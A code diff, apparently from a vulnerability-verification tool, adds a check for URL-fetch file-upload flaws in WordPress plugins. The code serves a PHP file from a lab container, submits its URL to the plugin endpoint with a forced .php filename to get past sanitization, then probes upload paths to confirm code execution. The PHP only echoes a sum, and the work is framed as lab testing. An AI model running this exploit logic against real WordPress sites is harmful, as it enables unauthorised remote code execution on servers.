@@ -12618,6 +12618,101 @@ def verify_wordpress_file_upload(
             "file_param": file_param, "metodo": m, "endpoint": endpoint,
         })
 
+        # URL-fetch upload: some plugins accept a URL param and fetch the remote file themselves.
+        # Detect when parameters contain a URL-like key (data[url], fetch_url, etc.) and no binary
+        # file field, then start a local HTTP server in the lab to serve a PHP shell.
+        _URL_FETCH_PARAM_NAMES = frozenset({
+            "data[url]", "url", "fetch_url", "source_url", "remote_url",
+            "image_url", "file_url", "download_url", "attachment_url",
+        })
+        _has_url_fetch = any(
+            str(k).lower() in _URL_FETCH_PARAM_NAMES
+            for k in (base_params or {}).keys()
+        )
+        _has_binary_field = any(
+            str(k).lower() in {"file", "upload", "data[file]", "attachment", "files"}
+            for k in (base_params or {}).keys()
+        )
+        if _has_url_fetch and not _has_binary_field:
+            step("[url-fetch upload] detected URL-fetch param — starting lab HTTP server...")
+            try:
+                _ws_token2 = _token()
+                _ws_content = f"<?php echo {secrets.randbelow(8000)+1000}+{secrets.randbelow(8000)+1000}; ?>".encode()
+                _ws_sum_a2 = int(_ws_content.split(b"echo ")[1].split(b"+")[0])
+                _ws_sum_b2 = int(_ws_content.split(b"+")[1].split(b";")[0])
+                _ws_expected2 = _ws_sum_a2 + _ws_sum_b2
+                # Plant the PHP shell in /tmp on the lab container
+                lab.exec("bash", "-c",
+                    f"mkdir -p /tmp/binoracle_serve && "
+                    f"printf '<?php echo {_ws_sum_a2}+{_ws_sum_b2}; ?>' "
+                    f"> /tmp/binoracle_serve/shell_{_ws_token2}.php",
+                    timeout=10)
+                # Start a simple HTTP server that serves /tmp/binoracle_serve
+                lab.exec("bash", "-c",
+                    "nohup python3 -m http.server 9999 --directory /tmp/binoracle_serve "
+                    "> /tmp/httpd_serve.log 2>&1 &",
+                    timeout=8)
+                time.sleep(1)
+                _shell_url2 = f"http://127.0.0.1:9999/shell_{_ws_token2}.php"
+                # Build fetch params
+                _url_fetch_params2 = dict(base_params)
+                for _ufp in _URL_FETCH_PARAM_NAMES:
+                    if _ufp in _url_fetch_params2:
+                        _url_fetch_params2[_ufp] = _shell_url2
+                        # Also set filename param to .php to avoid sanitization
+                        for _fk in list(_url_fetch_params2.keys()):
+                            if any(s in str(_fk).lower() for s in ("filename", "name", "data[filename]")):
+                                _url_fetch_params2[_fk] = f"shell_{_ws_token2}.php"
+                        break
+                _sess_uf = _attack_sess if _attack_sess is not None else boot.sub_sess
+                _r_uf = _sess_uf.post(boot.base_url + endpoint,
+                                       data=_url_fetch_params2, timeout=25)
+                step(f"[url-fetch] POST status={_r_uf.status_code} body={_r_uf.text[:100]!r}")
+                # Check if the uploaded file is accessible
+                _uf_candidates = [
+                    f"/wp-content/uploads/shell_{_ws_token2}.php",
+                    f"/uploads/shell_{_ws_token2}.php",
+                    f"/wp-content/uploads/{time.strftime('%Y/%m')}/shell_{_ws_token2}.php",
+                ]
+                # Also parse response for a URL/path
+                try:
+                    import json as _juf
+                    _rj_uf = _juf.loads(_r_uf.text or "{}")
+                    for _rk_uf in ("url", "file", "src", "path", "location", "file_url", "fileUrl"):
+                        _rv_uf = _rj_uf.get(_rk_uf)
+                        if not _rv_uf and isinstance(_rj_uf.get("data"), dict):
+                            _rv_uf = _rj_uf["data"].get(_rk_uf)
+                        if _rv_uf and isinstance(_rv_uf, str):
+                            _uf_candidates.insert(0, _rv_uf.replace(boot.base_url, "") if _rv_uf.startswith("http") else _rv_uf)
+                            break
+                except Exception:
+                    pass
+                for _uf_path in _uf_candidates:
+                    try:
+                        import requests as _rq_uf
+                        _uf_check_url = (_uf_path if _uf_path.startswith("http")
+                                         else boot.base_url + _uf_path)
+                        _r_uf2 = _rq_uf.get(_uf_check_url, timeout=8)
+                        if re.search(rf"(?<!\d){_ws_expected2}(?!\d)", _r_uf2.text or ""):
+                            res.evidence["url_fetch_upload_rce"] = {
+                                "uploaded_path": _uf_path, "php_sum": _ws_expected2,
+                                "output": (_r_uf2.text or "")[:200]}
+                            res.verified = True
+                            res.confidence = "confirmed"
+                            res.ok = True
+                            res.detail = (f"FILE UPLOAD (url-fetch) confirmado: servidor descargo "
+                                          f"shell desde URL interna y la ejecuto como PHP en {_uf_path}")
+                            step(f"[url-fetch] RCE confirmed via {_uf_path} (sum={_ws_expected2})")
+                            break
+                    except Exception:
+                        pass
+                if res.verified:
+                    res.evidence["screenshots"] = boot.shots
+                    res.evidence["http_captures"] = boot.http_captures
+                    return res
+            except Exception as _uf_exc:
+                step(f"[url-fetch] attempt failed: {_uf_exc!r:.80}")
+
         found = False
         tried = []
         # Probe mode: when no field was detected at analysis time, iterate over common
